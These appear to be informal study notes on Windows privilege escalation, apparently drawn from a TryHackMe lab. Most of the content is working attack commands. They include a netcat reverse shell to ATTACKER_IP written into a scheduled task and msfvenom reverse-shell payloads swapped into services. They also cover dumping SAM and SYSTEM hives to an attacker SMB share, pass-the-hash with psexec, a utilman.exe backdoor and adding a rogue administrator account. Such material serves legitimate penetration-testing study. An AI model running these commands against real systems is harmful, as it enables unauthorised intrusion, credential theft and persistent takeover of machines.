 
# Windows Privilege Escalation

Depending on the situation, we might need to abuse some of the following weaknesses:

- Misconfigurations on Windows services or scheduled tasks
- Excessive privileges assigned to our account
- Vulnerable software
- Missing Windows security patches

## Windows Users

|   |   |
|---|---|
|**Administrators**|These users have the most privileges. They can change any system configuration parameter and access any file in the system.|
|**Standard Users**|These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.|

Any user with administrative privileges will be part of the **Administrators** group. On the other hand, standard users are part of the **Users** group.


In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:

|                          |                                                                                                                                                                                         |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SYSTEM / LocalSystem** | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| **Local Service**        | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.                                                             |
| **Network Service**      | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.                                       |


# Harvesting Passwords from Usual Spots


## Unattended Windows Installations

a adminstrator have to install alot of windows on alot of devices this process leaves some default files which can contain passwords

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

```

<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>

```

## Powershell History

this is an commad to see the powershell history of the user usiing cmd

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.


## Saved Windows Credentials

to see the ceds of all the users in your pc or network

```shell-session
cmdkey /list
```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.

```shell-session
runas /savecred /user:admin cmd.exe
```


## IIS Configuration

it is the default website of windows and it has an config file which can contains creds

we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config


Here is a quick way to find database connection strings on the file:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems

While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.


```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.


# Other Quick Wins

## Scheduled Tasks

Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```


check


now we need to see do we have perm to chnage task to run aand how will we chech that using `icacls`

```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)

```

f means users have full access

`nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```


## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.


This method requires two registry values to be set. You can query these from the command line using the commands below.

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```



# Abusing Service Misconfigurations



## Windows Services

Windows services are managed by the **Service Control Manager** (SCM)

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started

Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:

```shell-session
C:\> sc qc apphostsvc
```

```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:

```shell-session
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable


make an reverse.exe and transfer it to the victim machine 
```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```
then start your nc listner
```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

--------------------summary
```

```

## Unquoted Service Paths


```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
```

here we are lokking at an service with an unquoted path so this is not good
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
First SCM will search for 

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.


we can make Disk.exe and SCM will execute that


most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)` by default, which isn't writable by unprivileged users


but sometimes they can make their own installing path which if writable perm can be exploited

Now using icacls we will chech the perm on the file 

```shell-session
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.


------------------summary
```
find the service with the unquoted path 
then check the perm

icacls c:\MyPrograms

`BUILTIN\\Users` group has AD and WD privileges

then it is exploitable
```




## Insecure Service Permissions


the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

DACL = Discretionary Access Control Lists


this is how you will check for the dacl of an service

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```


`BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service

now create an reverse shell exe then give `F` full access

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```


To change the service's associated executable and account, we can use the following command

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

We chose LocalSystem as it is the highest privileged account available.


-----------------------summary commands

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe


icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F


sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem



sc stop THMService
sc start THMService


```




# Abusing dangerous privileges


##  Windows Privileges


```shell-session
whoami /priv
```

this above command will give all the assigned prvlages of the account you are using 

list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.




## SeBackup / SeRestore


The SeBackup and SeRestore privileges  will allow the user to read and write to anything ignoring an DACL placed 


there are many techniques to exploit this but we will be using The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.


To backup the SAM and SYSTEM hashes, we can use the following commands:

```shell-session

reg save hklm\system C:\Users\THMBackup\system.hive


reg save hklm\sam C:\Users\THMBackup\sam.hive

```


We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py`


```
mkdir share 

impacket-smbserver -smb2support -username THMbackup -password CopyMaster555 Public share

```

now copy the files from victim machine to smb server

```

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

```


after copy use this commad to dump creds

```

impacket-secretsdump -sam sam.hive -system system.hive LOCAL

```


We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:


```shell-session
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.25.79
```



## SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys

if you see `SeTakeOwnershipPrivilege` enabled then also this will work

first open the cmd as administrator and give your password


We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen

```shell-session
takeown /f C:\Windows\System32\Utilman.exe
```

now we are the owner of the file  but we still have to provide privlages to the file

```shell-session
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```shell-session
copy cmd.exe utilman.exe
```

this will open the cmd with SYSTEM priv when the ease of access is clicked 




## SeImpersonate / SeAssignPrimaryToken





# Abusing vulnerable software


## Unpatched Software

as the name suggest we are gong to find software that are not updated 

to do that we will use wmic command

```shell-session
wmic product get name,version,vendor
```
	

```
poweshell command to add an user to the Administartor group


net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add

```



# Tools of the Trade



## WinPEAS

```shell-session
C:\> winpeas.exe > outputfile.txt
```

## PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system

```shell-session
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```


## WES-NG: Windows Exploit Suggester - Next Generation

[here](https://github.com/bitsadmin/wesng)


```
wes.py --update

user@kali$ wes.py systeminfo.txt


```

